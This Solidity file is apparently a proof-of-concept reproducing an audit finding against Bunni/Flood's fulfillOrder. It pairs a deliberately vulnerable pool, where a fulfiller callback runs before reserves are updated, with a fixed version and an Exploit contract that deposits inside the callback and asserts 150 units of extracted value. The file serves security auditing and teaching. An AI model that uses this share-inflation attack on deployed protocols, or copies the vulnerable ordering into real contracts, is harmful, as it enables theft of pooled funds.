// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Bunni / Flood — fulfillOrder (Pashov, August 2024, C-03)
    rebalanceOrderPreHook has already removed tokenIn. sourceConsideration
    runs before tokenOut is credited. The fulfiller deposits against that
    depressed value and is minted more shares than the post-hook reserves
    justify. With 1200/1200 liquidity, a 600 rebalance, and a 300/300 deposit,
    token0 ends 225 higher and the portfolio is 150 richer than it started.
    The same deposit made after both reserves move is value-neutral.
*/

interface IFulfiller {
    function sourceConsideration(uint256 amountOut) external returns (uint256 minted);
}

contract Erc20 {
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory s) {
        symbol = s;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Desk {
    function take(Erc20 inbound, Erc20 outbound, uint256 amount) external {
        require(inbound.transferFrom(msg.sender, address(this), amount), "in");
        require(outbound.transfer(msg.sender, amount), "out");
    }
}

contract BunniPool {
    Erc20 public immutable t0;
    Erc20 public immutable t1;
    uint256 public r0;
    uint256 public r1;
    uint256 public totalShares;
    mapping(address => uint256) public sharesOf;

    constructor(Erc20 _t0, Erc20 _t1) {
        t0 = _t0;
        t1 = _t1;
    }

    function seed(uint256 amount) external {
        require(t0.transferFrom(msg.sender, address(this), amount), "t0");
        require(t1.transferFrom(msg.sender, address(this), amount), "t1");
        r0 = amount;
        r1 = amount;
        totalShares = amount;
        sharesOf[address(1)] = amount;
    }

    function fulfillOrder(address fulfiller, uint256 amountIn, uint256 amountOut) external {
        r1 -= amountIn;
        require(t1.transfer(fulfiller, amountIn), "tokenIn");
        // @> VULN: sourceConsideration runs while tokenOut is still absent from reserves, so a deposit inside it mints against a depressed pool
        uint256 minted = IFulfiller(fulfiller).sourceConsideration(amountOut);
        require(minted > 0, "mint");
        require(t0.transferFrom(fulfiller, address(this), amountOut), "tokenOut");
        r0 += amountOut;
    }

    function deposit(uint256 a0, uint256 a1) external returns (uint256 minted) {
        uint256 value = r0 + r1;
        minted = (a0 + a1) * totalShares / value;
        require(t0.transferFrom(msg.sender, address(this), a0), "a0");
        require(t1.transferFrom(msg.sender, address(this), a1), "a1");
        r0 += a0;
        r1 += a1;
        sharesOf[msg.sender] += minted;
        totalShares += minted;
    }

    function withdraw() external returns (uint256 o0, uint256 o1) {
        uint256 s = sharesOf[msg.sender];
        o0 = s * r0 / totalShares;
        o1 = s * r1 / totalShares;
        sharesOf[msg.sender] = 0;
        totalShares -= s;
        r0 -= o0;
        r1 -= o1;
        require(t0.transfer(msg.sender, o0), "o0");
        require(t1.transfer(msg.sender, o1), "o1");
    }
}

contract BunniPoolFixed {
    Erc20 public immutable t0;
    Erc20 public immutable t1;
    uint256 public r0;
    uint256 public r1;
    uint256 public totalShares;
    mapping(address => uint256) public sharesOf;

    constructor(Erc20 _t0, Erc20 _t1) {
        t0 = _t0;
        t1 = _t1;
    }

    function seed(uint256 amount) external {
        require(t0.transferFrom(msg.sender, address(this), amount), "t0");
        require(t1.transferFrom(msg.sender, address(this), amount), "t1");
        r0 = amount;
        r1 = amount;
        totalShares = amount;
        sharesOf[address(1)] = amount;
    }

    function rebalance(address fulfiller, uint256 amountIn, uint256 amountOut) external {
        r1 -= amountIn;
        require(t1.transfer(fulfiller, amountIn), "tokenIn");
        require(t0.transferFrom(fulfiller, address(this), amountOut), "tokenOut");
        r0 += amountOut;
    }

    function deposit(uint256 a0, uint256 a1) external returns (uint256 minted) {
        minted = (a0 + a1) * totalShares / (r0 + r1);
        require(t0.transferFrom(msg.sender, address(this), a0), "a0");
        require(t1.transferFrom(msg.sender, address(this), a1), "a1");
        r0 += a0;
        r1 += a1;
        sharesOf[msg.sender] += minted;
        totalShares += minted;
    }

    function withdraw() external returns (uint256 o0, uint256 o1) {
        uint256 s = sharesOf[msg.sender];
        o0 = s * r0 / totalShares;
        o1 = s * r1 / totalShares;
        sharesOf[msg.sender] = 0;
        totalShares -= s;
        r0 -= o0;
        r1 -= o1;
        require(t0.transfer(msg.sender, o0), "o0");
        require(t1.transfer(msg.sender, o1), "o1");
    }
}

contract Exploit {
    uint256 public constant R = 1200 ether;
    uint256 public constant K = 600 ether;
    uint256 public constant D = 300 ether;
    Erc20 public t0;
    Erc20 public t1;
    Desk public desk;
    BunniPool public pool;
    uint256 public end0;
    uint256 public end1;

    constructor() {
        t0 = new Erc20("T0");
        t1 = new Erc20("T1");
        desk = new Desk();
        pool = new BunniPool(t0, t1);
        t0.mint(address(this), R + D + K);
        t1.mint(address(this), R + D);
        t0.mint(address(desk), K);
        t0.approve(address(pool), type(uint256).max);
        t1.approve(address(pool), type(uint256).max);
        t1.approve(address(desk), type(uint256).max);
        pool.seed(R);
    }

    function sourceConsideration(uint256 amountOut) external returns (uint256 minted) {
        amountOut;
        desk.take(t1, t0, K);
        minted = pool.deposit(D, D);
    }

    function run() external {
        pool.fulfillOrder(address(this), K, K);
        pool.withdraw();
        end0 = t0.balanceOf(address(this));
        end1 = t1.balanceOf(address(this));
        require(end0 == D + K + 225 ether, "token0 profit");
        require(end1 == D - 75 ether, "token1 leg");
        require(end0 + end1 == D + K + D + 150 ether, "150 extracted");
    }
}
